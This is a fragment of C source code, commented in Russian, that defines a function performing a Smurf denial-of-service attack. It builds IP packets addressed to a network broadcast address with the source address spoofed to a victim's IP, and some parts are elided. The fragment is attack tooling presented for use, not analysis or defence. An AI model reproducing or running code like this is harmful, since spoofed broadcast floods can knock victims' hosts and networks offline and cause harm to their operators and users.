...
/******************************************************************************/
//  Функция, осуществляющая атаку Smurf.
//
//  Входные параметры:
//      char *victim_ip_address - IP адресс жертвы.
//      char *broadcast_ip_address - широковещательный IP адресс сети.
...
/******************************************************************************/
int smurf(char *victim_ip_address, char *broadcast_ip_address, DWORD iteration, DWORD interval, WORD burst)
{
    int i = 0;          // Счетчик.
    ...
    ip.destination_ip_address = inet_addr(broadcast_ip_address);    // IP адрес получателя.
    ip.source_ip_address = inet_addr(victim_ip_address);            // IP адрес отправителя.
